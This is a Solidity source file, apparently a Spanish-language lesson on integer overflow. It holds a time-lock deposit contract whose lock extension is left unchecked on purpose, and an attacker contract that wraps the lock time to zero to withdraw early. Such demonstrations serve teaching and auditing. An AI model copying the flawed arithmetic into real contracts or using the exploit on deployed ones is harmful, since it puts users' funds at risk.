// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

contract DesbordamientoYSubestimacion {
    uint8 public balance;
    uint8 public balance2;

    function decrementar() public {
        balance--;
    }

    function incrementar() public {
        balance++;
    }

    function minimo() public view returns (uint8) {
        return type(uint8).min;
    }

    function maximo() public view returns (uint8) {
        return type(uint8).max;
    }

    function minimoMenos1() public view returns (uint8) {
        return type(uint8).min - 1;
    }

    function maximoMas1() public view returns (uint8) {
        return type(uint8).max + 1;
    }
}

contract BloquearTiempo {
    mapping(address => uint) public saldos;
    mapping(address => uint) public tiempoBloqueo;

    function depositar() external payable {
        saldos[msg.sender] += msg.value;
        tiempoBloqueo[msg.sender] = block.timestamp + 1 weeks;
    }

    function incrementarTiempoDeBloqueo (uint _segundosDeIncremento) public {
        tiempoBloqueo[msg.sender] += _segundosDeIncremento;
    }

    function retirar() public {
        require(saldos[msg.sender] > 0, "Fondos insuficientes");
        require(block.timestamp > tiempoBloqueo[msg.sender], "El tiempo de bloqueo no ha terminado");

        uint cantidad = saldos[msg.sender];
        saldos[msg.sender] = 0;

        // payable(msg.sender).transfer(cantidad); //en versiones nuevas de Solidity hace falta hacer la conversión de tipo a payable
        msg.sender.transfer(cantidad); //en versiones antiguas de Solidity no hacía falta hacer la conversión de tipo a payable
    }
}

contract Atacar {
    BloquearTiempo bloquearTiempo;

    constructor(BloquearTiempo _bloquearTiempo){
        bloquearTiempo = BloquearTiempo(_bloquearTiempo);
    }

    function atacar1() public payable {
        bloquearTiempo.depositar{value: msg.value}();
    }

    function atacar2() public {
        bloquearTiempo.incrementarTiempoDeBloqueo(
            // type(uint).max + 1 - bloquearTiempo.tiempoBloqueo(address(this))
            0 - bloquearTiempo.tiempoBloqueo(address(this))
        );
    }

    function atacar3() public {
        bloquearTiempo.retirar();
    }

    function saldoDelContrato() public view returns (uint) {
        uint saldo = address(this).balance;
        return saldo;
    }

    fallback() external payable {}
}